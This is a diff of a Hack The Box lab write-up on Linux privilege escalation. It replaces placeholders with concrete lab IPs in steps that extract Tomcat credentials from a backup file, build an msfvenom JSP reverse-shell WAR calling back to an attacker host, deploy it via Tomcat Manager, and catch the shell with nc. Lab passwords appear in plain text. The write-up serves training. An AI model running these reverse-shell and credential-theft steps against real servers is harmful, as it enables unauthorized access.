@@ -216,7 +216,7 @@ tcp6       0      0 :::22                   :::*                    LISTEN      
 tcp6       0      0 :::33060                :::*                    LISTEN      -
 ```
 
-Port `8080` is open — Apache Tomcat is running and externally accessible. The Tomcat Manager application is available at `http://<TARGET>:8080/manager/html`.
+Port `8080` is open — Apache Tomcat is running and externally accessible. The Tomcat Manager application is available at `http://10.129.91.85:8080/manager/html`.
 
 ### Step 2 — Hunt Tomcat Credentials
 
@@ -265,7 +265,7 @@ Hackerpatel007_1@htb[/htb]$ nc -nvlp 9001
 Generate a reverse shell WAR file using `msfvenom`:
 
 ```bash
-Hackerpatel007_1@htb[/htb]$ msfvenom -p java/jsp_shell_reverse_tcp LHOST=<ATTACKER-IP> LPORT=9001 -f war -o managerUpdated.war
+Hackerpatel007_1@htb[/htb]$ msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.15.43 LPORT=9001 -f war -o managerUpdated.war
 ```
 
 ```
@@ -276,7 +276,7 @@ Saved as: managerUpdated.war
 
 ### Step 4 — Deploy via Tomcat Manager
 
-1. Navigate to `http://<TARGET>:8080/manager/html`
+1. Navigate to `http://10.129.91.85:8080/manager/html`
 2. Authenticate with `tomcatadm:T0mc@t_s3cret_p@ss!`
 3. Scroll to the **WAR file to deploy** section
 4. Upload `managerUpdated.war` and click **Deploy**
@@ -285,8 +285,8 @@ Saved as: managerUpdated.war
 Reverse shell received:
 
 ```
-Ncat: Connection from 10.129.76.230.
-Ncat: Connection from 10.129.76.230:55938.
+Ncat: Connection from 10.129.91.85.
+Ncat: Connection from 10.129.91.85:55938.
 
 whoami
 tomcat
@@ -396,7 +396,7 @@ Any binary that invokes a pager (`less`, `more`, `man`) as part of its normal op
 ## Full Attack Chain Reference
 
 ```
-[Entry] SSH htb-student:Academy_LLPE!
+[Entry] SSH htb-student:Academy_LLPE! → 10.129.91.85
     │
     ├─[1] ls -lA → .config/.flag1.txt (hidden file enumeration)
     │
@@ -421,7 +421,7 @@ Any binary that invokes a pager (`less`, `more`, `man`) as part of its normal op
 
 | Command | Purpose |
 |---|---|
-| `ssh htb-student@<TARGET>` | Initial entry |
+| `ssh htb-student@10.129.91.85` | Initial entry |
 | `ls -lA` | List all files including hidden, with details |
 | `cat /home/barry/.bash_history` | Credential hunting in shell history |
 | `su barry` | Switch to barry using discovered password |
@@ -429,7 +429,7 @@ Any binary that invokes a pager (`less`, `more`, `man`) as part of its normal op
 | `cat /var/log/flag3.txt` | Read flag via adm group read access |
 | `netstat -tulpn \| grep LISTEN` | Discover internal and external listening services |
 | `cat /etc/tomcat9/tomcat-users.xml.bak` | Extract Tomcat credentials from backup config |
-| `msfvenom -p java/jsp_shell_reverse_tcp ... -f war` | Generate reverse shell WAR payload |
+| `msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.15.43 LPORT=9001 -f war` | Generate reverse shell WAR payload |
 | `nc -nvlp 9001` | Catch reverse shell on attack host |
 | `python3 -c 'import pty;pty.spawn("/bin/bash")'` | Upgrade to PTY for interactive pager |
 | `sudo -l` | Enumerate sudo permissions |
